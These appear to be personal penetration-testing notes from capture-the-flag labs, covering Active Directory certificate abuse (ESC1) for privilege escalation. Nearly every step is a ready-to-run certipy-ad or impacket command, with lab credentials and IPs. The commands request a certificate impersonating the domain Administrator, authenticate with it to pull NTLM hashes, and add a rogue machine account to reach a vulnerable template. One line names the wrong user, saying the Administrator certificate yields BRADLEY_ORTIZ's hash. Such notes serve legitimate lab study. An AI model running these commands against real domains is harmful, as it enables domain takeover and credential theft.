
When an HTTPS Server is running on an AD Box, there could be an potential that we can do retrieve information or even exploit an internal CA or receive user hashes.
## ESC1 PrivEsc

![[Pasted image 20260510015119.png]]

This command requests a certificate file "administrator.pfx" for the user Administrator by using SUSANNA_MCKNIGHT's credentials to impersonate that user's UPN with the ServerAuth template.

```
certipy-ad req -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' -upn 'administrator@thm.local' -dc-ip 10.113.155.93 -target labyrinth.thm.local
```

This command uses the certificate file administrator.pfx to authenticate to the domain controller and retrieve the NTLM hash for the user BRADLEY_ORTIZ.

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.113.155.93
```

---
## Enrolled Computers

Found out that the target Domain Controller is vulnerable to ESC1 Attack, but only as Domain Computer.

```
cat 20260810082037_Certipy.txt
[+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

As we can see Domain Computers can abuse ESC1 Attacks, let's therefore add an Computer onto the target.

1. Added Computer

```
impacket-addcomputer 'authority.htb/svc_ldap' -method LDAPS -computer-name saitama -computer-pass 'password123!' -dc-ip 10.129.229.56
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Successfully added machine account saitama$ with password password123!.
```

2. Requested administrator.pfx file using the previously created machine account.

```
certipy-ad req -u saitama$ -password 'password123!' -ca AUTHORITY-CA -dc-ip 10.129.229.56 -template CorpVPN -upn administrator@authority.htb
```

3. Retrieved NTLM Hash of Administrator User.

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.56
```
